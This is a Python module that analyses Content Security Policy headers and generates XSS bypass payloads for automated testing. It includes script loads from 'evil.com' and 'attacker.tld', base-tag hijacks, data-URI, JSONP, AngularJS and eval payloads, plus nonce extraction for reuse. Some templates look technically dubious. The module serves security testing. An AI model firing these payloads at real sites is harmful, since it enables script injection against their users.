"""
Content Security Policy (CSP) analysis and bypass automation module.
Consolidates CSP policy evaluation, weakness detection, and automated bypass payloads.
"""

from __future__ import annotations

import re
from dataclasses import dataclass
from enum import Enum
from typing import Dict, List, Optional
from urllib.parse import urlsplit


def _normalize_host_source(source: str) -> Optional[str]:
    """Return the hostname of a CSP host-source expression.

    ``None`` is returned for scheme sources (``data:``), keywords
    (``'self'``, ``'unsafe-inline'``), nonces/hashes and tokens that do not
    parse as a host.  Wildcard hosts keep their leading ``*.`` so the caller
    can apply the CSP subdomain-matching rules.
    """
    token = str(source or "").strip().strip("'\"")
    if not token:
        return None
    lower = token.lower()
    if lower.startswith(("nonce-", "sha256-", "sha384-", "sha512-")):
        return None
    if "://" in lower:
        candidate = lower
    elif lower.startswith("//"):
        candidate = "http:" + lower
    else:
        candidate = "http://" + lower
    try:
        host = urlsplit(candidate).hostname
    except ValueError:
        return None
    if not host:
        return None
    host = host.lower()
    # ``data:``/``blob:``/``https:`` parse as a host named after the scheme;
    # they are scheme sources, not hosts.
    if lower.endswith(":") and re.fullmatch(r"[a-z][a-z0-9+.-]*", host):
        return None
    return host


def _source_allows_host(source: str, host: str) -> bool:
    """Whether a CSP source expression permits ``host``.

    Compares parsed hostnames instead of substrings, so
    ``https://evil.example/ajax.googleapis.com`` does not match
    ``ajax.googleapis.com``.  ``*.example.com`` follows CSP wildcard rules:
    it matches subdomains and the bare domain, but not lookalikes such as
    ``notexample.com``.
    """
    hostname = _normalize_host_source(source)
    if not hostname:
        return False
    wanted = host.lower()
    if hostname.startswith("*."):
        suffix = hostname[2:]
        return wanted == suffix or wanted.endswith("." + suffix)
    return hostname == wanted


def _is_scheme_source(source: str, scheme: str) -> bool:
    """Whether ``source`` is exactly the CSP scheme source ``scheme:``.

    Scheme sources are unquoted in CSP; a quoted ``'data:'`` is a keyword,
    not a scheme source.
    """
    return str(source or "").strip().lower() == f"{scheme.lower()}:"


def _is_csp_keyword(source: str, keyword: str) -> bool:
    """Whether ``source`` is the CSP keyword (quoted or bare, any case)."""
    return str(source or "").strip().strip("'\"").lower() == keyword.lower()


class CSPSeverity(Enum):
    """CSP issue severity levels."""
    CRITICAL = "critical"
    HIGH = "high"
    MEDIUM = "medium"
    LOW = "low"
    INFO = "info"


class CSPDirective(Enum):
    """CSP directives relevant to XSS."""
    SCRIPT_SRC = "script-src"
    DEFAULT_SRC = "default-src"
    STYLE_SRC = "style-src"
    IMG_SRC = "img-src"
    CONNECT_SRC = "connect-src"
    OBJECT_SRC = "object-src"
    FRAME_SRC = "frame-src"
    BASE_URI = "base-uri"
    FORM_ACTION = "form-action"
    REPORT_URI = "report-uri"
    REPORT_TO = "report-to"


@dataclass
class CSPIssue:
    """CSP policy issue."""
    issue_type: str
    severity: CSPSeverity
    description: str
    directive: Optional[str]
    value: Optional[str]


@dataclass
class CSPBypass:
    """CSP bypass technique."""
    technique: str
    payload: str = ""
    description: str = ""
    success_probability: float = 0.5
    # Extended fields for automator compatibility
    payload_template: str = ""
    target_directive: Optional[CSPDirective] = None
    confidence: float = 0.5

    def __post_init__(self) -> None:
        if not self.payload and self.payload_template:
            self.payload = self.payload_template
        elif not self.payload_template and self.payload:
            self.payload_template = self.payload
        if self.confidence != 0.5 and self.success_probability == 0.5:
            self.success_probability = self.confidence
        elif self.success_probability != 0.5 and self.confidence == 0.5:
            self.confidence = self.success_probability


@dataclass
class CSPAnalysis:
    """Complete CSP analysis."""
    is_strict: bool
    bypass_possible: bool
    issues: List[CSPIssue]
    bypasses: List[CSPBypass]
    directives: Dict[str, List[str]]
    raw_csp: str


class CSPAnalyzer:
    """
    Advanced CSP analyzer.
    Analyzes Content-Security-Policy headers for bypass opportunities and weaknesses.
    """

    DANGEROUS_VALUES = ['*', 'unsafe-inline', 'unsafe-eval', 'data:', 'blob:', 'http:', 'https:']
    REQUIRED_DIRECTIVES = ['default-src', 'script-src']
    RECOMMENDED_DIRECTIVES = ['object-src', 'base-uri', 'form-action', 'frame-ancestors']

    BYPASS_TECHNIQUES = {
        'unsafe_inline': {
            'technique': 'unsafe-inline bypass',
            'payload': '<script>alert(1)</script>',
            'description': 'Direct script execution with unsafe-inline',
        },
        'wildcard_origin': {
            'technique': 'Wildcard origin bypass',
            'payload': '<script src="http://evil.com/exploit.js"></script>',
            'description': 'Load scripts from any origin with wildcard',
        },
        'data_uri': {
            'technique': 'data: URI bypass',
            'payload': '<script src="data:text/javascript,alert(1)"></script>',
            'description': 'Execute script from data URI',
        },
        'jsonp_gadget': {
            'technique': 'JSONP gadget bypass',
            'payload': '<script src="https://ajax.googleapis.com/ajax/services/feed/find?v=1.0&q=test&callback=alert(1)"></script>',
            'description': 'Use JSONP gadget to execute code',
        },
        'angular_cdn': {
            'technique': 'Angular CDN bypass',
            'payload': '{{xss="alert(1)"}}',
            'description': 'Angular template injection with CDN',
        },
        'nonce_reuse': {
            'technique': 'Nonce reuse bypass',
            'payload': '<script nonce="KNOWN_NONCE">alert(1)</script>',
            'description': 'Reuse valid nonce if predictable',
        },
        'unsafe_eval': {
            'technique': 'unsafe-eval bypass',
            'payload': '<img src=x onerror="eval(atob(\'YWxlcnQoMSk=\'))">',
            'description': 'Dynamic code execution with unsafe-eval',
        },
        'strict_dynamic_gadget': {
            'technique': 'strict-dynamic gadget',
            'payload': '<script src="/static/app.js"></script>',
            'description': 'A trusted script that consumes a DOM source creates script',
        },
        'weak_nonce': {
            'technique': 'Weak nonce prediction',
            'payload': '<script nonce="{nonce}">alert(1)</script>',
            'description': 'Short or reused nonce lets an injected script borrow it',
        },
        'base_uri_hijack': {
            'technique': 'base-uri hijack',
            'payload': '<base href="https://attacker.tld/">',
            'description': 'Missing base-uri redirects relative script loads',
        },
        'object_data': {
            'technique': 'object data bypass',
            'payload': '<object data="data:text/html,alert(1)"></object>',
            'description': 'Missing object-src permits plugin/HTML objects',
        },
    }

    def __init__(self) -> None:
        self._cache: Dict[str, CSPAnalysis] = {}

    def parse_csp(self, csp_header: str) -> Dict[str, List[str]]:
        """Parse a CSP header into directive name -> list of tokens.

        Directive names are case-insensitive and duplicate directives are
        merged (browsers apply every occurrence), so the normalization happens
        here rather than at every call site.
        """
        directives: Dict[str, List[str]] = {}
        for directive in str(csp_header or "").split(';'):
            directive = directive.strip()
            if not directive:
                continue
            parts = directive.split()
            directive_name = parts[0].lower()
            values = parts[1:] if len(parts) > 1 else []
            if directive_name in directives:
                directives[directive_name].extend(values)
            else:
                directives[directive_name] = list(values)
        return directives

    def analyze_csp(self, csp_header: str) -> CSPAnalysis:
        """Analyze a CSP header for security issues."""
        if csp_header in self._cache:
            return self._cache[csp_header]

        directives = self.parse_csp(csp_header)
        issues: List[CSPIssue] = []
        bypasses: List[CSPBypass] = []

        # Effective script policy: `script-src` falls back to `default-src`.
        script_values = directives.get('script-src')
        if script_values is None:
            script_values = directives.get('default-src', [])
        normalized_script = [value.strip().strip("'\"").lower() for value in script_values]
        strict_dynamic = 'strict-dynamic' in normalized_script
        nonce_values = [
            value[len("nonce-"):]
            for value in normalized_script
            if value.startswith("nonce-")
        ]
        hash_present = any(
            value.startswith(("sha256-", "sha384-", "sha512-"))
            for value in normalized_script
        )
        # CSP3: with 'strict-dynamic' and a nonce/hash, browsers ignore both
        # host allowlists and 'unsafe-inline'.  Treating 'unsafe-inline' as a
        # direct bypass there is a false positive.
        strict_dynamic_trusted = strict_dynamic and bool(nonce_values or hash_present)

        # Check for a script policy at all.  Only one of the two directives is
        # required; `default-src` is the documented fallback.
        if 'script-src' not in directives and 'default-src' not in directives:
            issues.append(CSPIssue(
                issue_type="missing_directive",
                severity=CSPSeverity.HIGH,
                description="Missing script-src and default-src directives",
                directive="script-src",
                value=None,
            ))

        if strict_dynamic_trusted:
            issues.append(CSPIssue(
                issue_type="strict_dynamic",
                severity=CSPSeverity.INFO,
                description=(
                    "script-src uses 'strict-dynamic'; host allowlists and "
                    "'unsafe-inline' are ignored, so a trusted script gadget is "
                    "the remaining route to execution"
                ),
                directive="script-src",
                value="'strict-dynamic'",
            ))
            bypasses.append(CSPBypass(
                technique=self.BYPASS_TECHNIQUES['strict_dynamic_gadget']['technique'],
                payload_template=self.BYPASS_TECHNIQUES['strict_dynamic_gadget']['payload'],
                description=self.BYPASS_TECHNIQUES['strict_dynamic_gadget']['description'],
                target_directive=CSPDirective.SCRIPT_SRC,
                confidence=0.5,
            ))

        # Check for missing recommended directives
        for recommended in self.RECOMMENDED_DIRECTIVES:
            if recommended not in directives:
                issues.append(CSPIssue(
                    issue_type="missing_recommended_directive",
                    severity=CSPSeverity.MEDIUM,
                    description=f"Missing {recommended} directive (recommended)",
                    directive=recommended,
                    value=None,
                ))

        # `base-uri` is the one recommended directive that is independently
        # exploitable: an injected <base> re-points every relative script URL,
        # defeating a strict script-src host allowlist.
        if 'base-uri' not in directives:
            issues.append(CSPIssue(
                issue_type="missing_base_uri",
                severity=CSPSeverity.HIGH,
                description=(
                    "Missing base-uri allows <base> injection to hijack "
                    "relative script and stylesheet URLs"
                ),
                directive="base-uri",
                value=None,
            ))
            bypasses.append(CSPBypass(
                technique=self.BYPASS_TECHNIQUES['base_uri_hijack']['technique'],
                payload_template=self.BYPASS_TECHNIQUES['base_uri_hijack']['payload'],
                description=self.BYPASS_TECHNIQUES['base_uri_hijack']['description'],
                target_directive=CSPDirective.BASE_URI,
                confidence=0.8,
            ))

        # `object-src` falls back to `default-src`; report the bypass only when
        # the effective policy still permits data: or a wildcard.
        if 'object-src' not in directives:
            object_fallback = [
                value.strip().strip("'\"").lower()
                for value in directives.get('default-src', [])
            ]
            if not object_fallback or any(
                value in ('*', 'data:', 'http:', 'https:') for value in object_fallback
            ):
                bypasses.append(CSPBypass(
                    technique=self.BYPASS_TECHNIQUES['object_data']['technique'],
                    payload_template=self.BYPASS_TECHNIQUES['object_data']['payload'],
                    description=self.BYPASS_TECHNIQUES['object_data']['description'],
                    target_directive=CSPDirective.OBJECT_SRC,
                    confidence=0.6,
                ))

        # Weak or missing nonce entropy makes nonce-based strict CSP bypassable.
        for nonce in nonce_values:
            if len(nonce) < 16:
                issues.append(CSPIssue(
                    issue_type="weak_nonce",
                    severity=CSPSeverity.HIGH,
                    description=(
                        f"Nonce is only {len(nonce)} characters; short nonces are "
                        "guessable and are commonly reused across responses"
                    ),
                    directive="script-src",
                    value=f"nonce-{nonce}",
                ))
                bypasses.append(CSPBypass(
                    technique=self.BYPASS_TECHNIQUES['weak_nonce']['technique'],
                    payload_template=self.BYPASS_TECHNIQUES['weak_nonce']['payload'],
                    description=self.BYPASS_TECHNIQUES['weak_nonce']['description'],
                    target_directive=CSPDirective.SCRIPT_SRC,
                    confidence=0.6,
                ))
                break

        # Check for dangerous values
        for directive, values in directives.items():
            for value in values:
                raw_val = value.strip("'\"").lower()
                matched_dangerous = None
                for dangerous in self.DANGEROUS_VALUES:
                    if dangerous.endswith(':'):
                        if raw_val in (dangerous, dangerous + '*'):
                            matched_dangerous = dangerous
                            break
                    elif raw_val == dangerous or value == dangerous:
                        matched_dangerous = dangerous
                        break
                if matched_dangerous:
                    issues.append(CSPIssue(
                        issue_type="dangerous_value",
                        severity=(
                            CSPSeverity.LOW
                            if matched_dangerous == 'unsafe-inline' and strict_dynamic_trusted
                            else CSPSeverity.HIGH
                        ),
                        description=(
                            f"{directive} contains dangerous value: {matched_dangerous}"
                            + (
                                " (ignored because 'strict-dynamic' is active)"
                                if matched_dangerous == 'unsafe-inline' and strict_dynamic_trusted
                                else ""
                            )
                        ),
                        directive=directive,
                        value=value,
                    ))

                    if matched_dangerous == 'unsafe-inline':
                        if strict_dynamic_trusted:
                            continue
                        bypasses.append(CSPBypass(
                            technique=self.BYPASS_TECHNIQUES['unsafe_inline']['technique'],
                            payload=self.BYPASS_TECHNIQUES['unsafe_inline']['payload'],
                            description=self.BYPASS_TECHNIQUES['unsafe_inline']['description'],
                            success_probability=0.9,
                        ))
                    elif matched_dangerous == 'unsafe-eval':
                        bypasses.append(CSPBypass(
                            technique=self.BYPASS_TECHNIQUES['unsafe_eval']['technique'],
                            payload=self.BYPASS_TECHNIQUES['unsafe_eval']['payload'],
                            description=self.BYPASS_TECHNIQUES['unsafe_eval']['description'],
                            target_directive=CSPDirective.SCRIPT_SRC,
                            confidence=0.7,
                        ))
                    elif matched_dangerous == '*':
                        bypasses.append(CSPBypass(
                            technique=self.BYPASS_TECHNIQUES['wildcard_origin']['technique'],
                            payload=self.BYPASS_TECHNIQUES['wildcard_origin']['payload'],
                            description=self.BYPASS_TECHNIQUES['wildcard_origin']['description'],
                            success_probability=0.8,
                        ))
                    elif matched_dangerous == 'data:':
                        bypasses.append(CSPBypass(
                            technique=self.BYPASS_TECHNIQUES['data_uri']['technique'],
                            payload=self.BYPASS_TECHNIQUES['data_uri']['payload'],
                            description=self.BYPASS_TECHNIQUES['data_uri']['description'],
                            success_probability=0.7,
                        ))

        # Check for JSONP gadget domains
        gadget_domains = ['ajax.googleapis.com', 'cdn.jsdelivr.net', 'cdnjs.cloudflare.com']
        for directive, values in directives.items():
            for value in values:
                for gadget in gadget_domains:
                    if _source_allows_host(value, gadget):
                        issues.append(CSPIssue(
                            issue_type="jsonp_gadget_domain",
                            severity=CSPSeverity.MEDIUM,
                            description=f"{directive} allows JSONP gadget domain: {gadget}",
                            directive=directive,
                            value=value,
                        ))
                        bypasses.append(CSPBypass(
                            technique=self.BYPASS_TECHNIQUES['jsonp_gadget']['technique'],
                            payload=self.BYPASS_TECHNIQUES['jsonp_gadget']['payload'],
                            description=self.BYPASS_TECHNIQUES['jsonp_gadget']['description'],
                            success_probability=0.6,
                        ))

        bypass_possible = len(bypasses) > 0
        high_severity = any(
            issue.severity in (CSPSeverity.CRITICAL, CSPSeverity.HIGH) for issue in issues
        )
        is_strict = not bypass_possible and not high_severity

        analysis = CSPAnalysis(
            is_strict=is_strict,
            bypass_possible=bypass_possible,
            issues=issues,
            bypasses=bypasses,
            directives=directives,
            raw_csp=csp_header,
        )
        self._cache[csp_header] = analysis
        return analysis

    def suggest_bypass_payloads(
        self,
        analysis: CSPAnalysis,
        marker: str,
    ) -> List[str]:
        """Suggest potential CSP bypass payloads."""
        payloads: List[str] = []
        for bypass in analysis.bypasses:
            payload = bypass.payload.replace('alert(1)', f"window.__xoxss_csp.push('{marker}')")
            payloads.append(payload)
        return payloads

    def calculate_csp_score(self, analysis: CSPAnalysis) -> float:
        """Calculate overall CSP security score (0-1)."""
        if analysis.is_strict:
            return 1.0

        score = 1.0
        for issue in analysis.issues:
            if issue.severity == CSPSeverity.CRITICAL:
                score -= 0.3
            elif issue.severity == CSPSeverity.HIGH:
                score -= 0.2
            elif issue.severity == CSPSeverity.MEDIUM:
                score -= 0.1
            elif issue.severity == CSPSeverity.LOW:
                score -= 0.05

        score -= len(analysis.bypasses) * 0.15
        return max(0.0, round(score, 2))


class CSPBypassAutomator:
    """
    CSP bypass automation.
    Detects and tests CSP bypass techniques across directives.
    """

    BYPASS_TECHNIQUES = [
        CSPBypass(
            technique="data_uri",
            payload_template='data:text/javascript,{m}',
            description="data: URI script execution",
            target_directive=CSPDirective.SCRIPT_SRC,
            confidence=0.8,
        ),
        CSPBypass(
            technique="json_gadget",
            payload_template='{"__proto__":{m}}',
            description="JSONP gadget via data URI",
            target_directive=CSPDirective.SCRIPT_SRC,
            confidence=0.7,
        ),
        CSPBypass(
            technique="trusted_types_bypass",
            payload_template='<script type="trusted-types">{m}</script>',
            description="Trusted Types directive bypass",
            target_directive=CSPDirective.SCRIPT_SRC,
            confidence=0.6,
        ),
        CSPBypass(
            technique="nonce_prediction",
            payload_template='<script nonce="{nonce}">{m}</script>',
            description="Nonce prediction attack",
            target_directive=CSPDirective.SCRIPT_SRC,
            confidence=0.5,
        ),
        CSPBypass(
            technique="hash_source_bypass",
            payload_template='<script src="{m}#sha256-abc..."></script>',
            description="Hash source bypass",
            target_directive=CSPDirective.SCRIPT_SRC,
            confidence=0.4,
        ),
        CSPBypass(
            technique="angular_cdn",
            payload_template='<script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.0.8/angular.min.js"></script><div ng-app ng-csp>{m}</div>',
            description="Angular CSP bypass via CDN",
            target_directive=CSPDirective.SCRIPT_SRC,
            confidence=0.9,
        ),
        CSPBypass(
            technique="base_tag_injection",
            payload_template='<base href="https://attacker.tld/">',
            description="Base tag injection for script loading",
            target_directive=CSPDirective.BASE_URI,
            confidence=0.8,
        ),
        CSPBypass(
            technique="iframe_sandbox",
            payload_template='<iframe sandbox="allow-scripts" srcdoc="{m}"></iframe>',
            description="iframe sandbox bypass",
            target_directive=CSPDirective.FRAME_SRC,
            confidence=0.7,
        ),
        CSPBypass(
            technique="object_data",
            payload_template='<object data="data:text/html,{m}"></object>',
            description="Object data URI bypass",
            target_directive=CSPDirective.OBJECT_SRC,
            confidence=0.8,
        ),
        CSPBypass(
            technique="style_attribute",
            payload_template='<div style="background:url({m})"></div>',
            description="Style attribute injection",
            target_directive=CSPDirective.STYLE_SRC,
            confidence=0.6,
        ),
        CSPBypass(
            technique="unsafe_eval",
            payload_template='<img src=x onerror="eval(atob(\'{m}\'))">',
            description="unsafe-eval permits dynamic code execution",
            target_directive=CSPDirective.SCRIPT_SRC,
            confidence=0.7,
        ),
    ]

    def __init__(self) -> None:
        self._detected_bypasses: List[CSPBypass] = []

    def parse_csp(self, csp_header: str) -> Dict[CSPDirective, List[str]]:
        """Parse CSP header into directive enums."""
        csp: Dict[CSPDirective, List[str]] = {}
        if not csp_header:
            return csp
        for directive in csp_header.split(';'):
            directive = directive.strip()
            if not directive:
                continue
            parts = directive.split()
            if not parts:
                continue
            directive_name = parts[0].lower()
            try:
                directive_enum = CSPDirective(directive_name)
                csp[directive_enum] = parts[1:] if len(parts) > 1 else ['*']
            except ValueError:
                pass
        return csp

    def analyze_weaknesses(self, csp: Dict[CSPDirective, List[str]]) -> List[str]:
        """Analyze CSP for exploitable weaknesses."""
        weaknesses: List[str] = []
        script_src = csp.get(CSPDirective.SCRIPT_SRC, [])
        default_src = csp.get(CSPDirective.DEFAULT_SRC, [])
        effective_script = script_src or default_src
        normalized_script = [
            str(value).strip().strip("'\"").lower() for value in effective_script
        ]
        if 'unsafe-inline' in normalized_script:
            if 'strict-dynamic' in normalized_script and any(
                value.startswith(("nonce-", "sha256-", "sha384-", "sha512-"))
                for value in normalized_script
            ):
                weaknesses.append(
                    "script-src sets unsafe-inline but 'strict-dynamic' makes "
                    "browsers ignore it (trusted-script gadget required)"
                )
            else:
                weaknesses.append("script-src allows unsafe-inline")
        if 'unsafe-eval' in normalized_script:
            weaknesses.append("script-src allows unsafe-eval")
        if '*' in normalized_script:
            weaknesses.append("script-src allows wildcard (*)")
        if not effective_script:
            weaknesses.append("No script-src or default-src directive")
        elif CSPDirective.SCRIPT_SRC not in csp and '*' in default_src:
            weaknesses.append("No script-src directive, falls back to permissive default-src")
        if CSPDirective.OBJECT_SRC not in csp:
            object_fallback = default_src
            if not object_fallback or any(
                str(value).strip().strip("'\"").lower() in ('*', 'data:', 'http:', 'https:')
                for value in object_fallback
            ):
                weaknesses.append("No object-src directive, object/embed may execute")
        if CSPDirective.BASE_URI not in csp:
            weaknesses.append(
                "No base-uri directive, <base> injection can hijack relative scripts"
            )
        for value in normalized_script:
            if value.startswith("nonce-") and len(value) - len("nonce-") < 16:
                weaknesses.append("Script nonce is short enough to be guessable/reused")
                break
        if CSPDirective.REPORT_URI in csp:
            weaknesses.append("Legacy report-uri directive present (may be XSS vector)")
        return weaknesses

    def get_applicable_bypasses(
        self,
        csp: Dict[CSPDirective, List[str]],
        marker: str = "xoxss",
    ) -> List[CSPBypass]:
        """Get applicable bypasses for the given CSP configuration."""
        applicable: List[CSPBypass] = []
        default_src = csp.get(CSPDirective.DEFAULT_SRC, [])

        for bypass in self.BYPASS_TECHNIQUES:
            target_directive = bypass.target_directive or CSPDirective.SCRIPT_SRC

            # `base-uri` has no default-src fallback: its absence is the
            # weakness, so the technique applies whenever the directive is
            # missing (or explicitly allows an attacker-reachable host).
            if bypass.technique == "base_tag_injection":
                if target_directive not in csp:
                    applicable.append(bypass)
                continue

            # `object-src` does fall back to `default-src`; only a permissive
            # effective policy is exploitable.
            if bypass.technique == "object_data":
                object_values = csp.get(CSPDirective.OBJECT_SRC, default_src)
                if not object_values or any(
                    str(value).strip().strip("'\"").lower() in ('*', 'data:', 'http:', 'https:')
                    for value in object_values
                ):
                    applicable.append(bypass)
                continue

            values = csp.get(target_directive, default_src)
            if not values:
                continue
            if '*' in values:
                applicable.append(bypass)
                continue
            if bypass.technique == "data_uri" and any(
                _is_scheme_source(v, "data") for v in values
            ):
                applicable.append(bypass)
            elif bypass.technique == "angular_cdn" and any(
                _source_allows_host(v, "ajax.googleapis.com") for v in values
            ):
                applicable.append(bypass)
            elif bypass.technique == "unsafe_eval" and any(
                _is_csp_keyword(v, "unsafe-eval") for v in values
            ):
                applicable.append(bypass)
            elif bypass.technique == "iframe_sandbox" and any(
                _is_csp_keyword(v, "sandbox") for v in values
            ):
                applicable.append(bypass)

        return applicable

    def generate_bypass_payloads(
        self,
        bypasses: List[CSPBypass],
        marker: str,
        nonce: Optional[str] = None,
    ) -> List[str]:
        """Generate test payloads for applicable bypasses."""
        payloads: List[str] = []
        for bypass in bypasses:
            template = bypass.payload_template or bypass.payload
            payload = template.replace("{m}", marker)
            if nonce and "{nonce}" in payload:
                payload = payload.replace("{nonce}", nonce)
            payloads.append(payload)
        return payloads

    def test_nonce_prediction(self, html_content: str) -> Optional[str]:
        """Extract or predict script nonce from HTML content."""
        patterns = [
            r'nonce\s*=\s*["\']([^"\']+)["\']',
            r'<script[^>]*nonce=([a-zA-Z0-9+/=]+)',
        ]
        for pattern in patterns:
            matches = re.findall(pattern, html_content)
            if matches:
                return matches[0]
        return None

    def generate_csp_report(self, csp: Dict[CSPDirective, List[str]]) -> str:
        """Generate human-readable summary of CSP directives."""
        report = ["Content-Security-Policy Analysis", ""]
        for directive, values in csp.items():
            report.append(f"{directive.value}: {', '.join(values)}")
        return "\n".join(report)


__all__ = [
    "CSPAnalysis",
    "CSPAnalyzer",
    "CSPBypass",
    "CSPBypassAutomator",
    "CSPDirective",
    "CSPIssue",
    "CSPSeverity",
]
